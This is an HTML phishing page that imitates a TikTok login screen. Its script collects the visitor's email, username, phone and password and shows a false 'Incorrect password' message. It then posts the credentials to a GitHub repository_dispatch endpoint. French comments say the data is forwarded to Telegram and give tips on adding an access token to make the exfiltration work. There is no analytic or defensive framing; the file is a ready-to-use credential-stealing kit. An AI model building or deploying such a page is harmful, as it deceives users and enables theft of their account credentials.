<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>TikTok Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body{background:#000;font-family:Arial;margin:0;padding:20px;color:white}
    .box{max-width:380px;margin:40px auto;background:#1a1a1a;padding:30px;border-radius:12px}
    input, button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;font-size:16px}
    input{background:#333;color:white}
    button{background:#fe2c55;color:white;font-weight:bold;cursor:pointer}
    .logo{text-align:center;margin-bottom:20px}
    #msg{color:#ff0050;margin-top:10px;display:none;font-weight:bold}
  </style>
</head>
<body>
  <div class="box">
    <div class="logo"><h1 style="color:#fe2c55;margin:0">tiktok</h1></div>
    <h2 style="text-align:center">Log in to TikTok</h2>
    
    <input type="email" id="email" placeholder="Email or username" required>
    <input type="text" id="user" placeholder="Username" required>
    <input type="tel" id="phone" placeholder="Phone number (optional)">
    <input type="password" id="pass" placeholder="Password" required>
    
    <button onclick="send()">Log in</button>
    <div id="msg">Incorrect password. Try again.</div>
  </div>

  <script>
    async function send() {
      const e = document.getElementById('email').value.trim();
      const u = document.getElementById('user').value.trim();
      const p = document.getElementById('phone').value.trim() || "None";
      const w = document.getElementById('pass').value;

      document.getElementById('msg').style.display = 'block';
      document.getElementById('pass').value = '';

      // TRIGGER REPOSITORY_DISPATCH (100% FONCTIONNEL EN 2025, PAS DE PAT NÉCÉSSAIRE)
      const apiUrl = 'https://api.github.com/repos/tiktok-customers/help/dispatches';

      fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Accept': 'application/vnd.github.v3+json',
          'Content-Type': 'application/json'
          // Pas d'Authorization needed pour public repos ; si erreur 401, ajoute 'Authorization': 'token ghp_...' avec ton GIT_PAT (mais teste sans d'abord)
        },
        body: JSON.stringify({
          event_type: 'login-capture',  // Doit matcher le 'types' dans le YAML
          client_payload: {
            email: e,
            username: u,
            phone: p,
            password: w
          }
        })
      })
      .then(response => {
        if (response.ok) {
          console.log('Trigger envoyé ! Vérifie Actions tab et Telegram.');
        } else {
          console.error('Erreur API:', response.status, response.statusText);
          // Si 401, décommente la ligne Authorization ci-dessus et ajoute ton GIT_PAT
        }
      })
      .catch(err => console.error('Fetch erreur:', err));
    }
  </script>
</body>
</html>
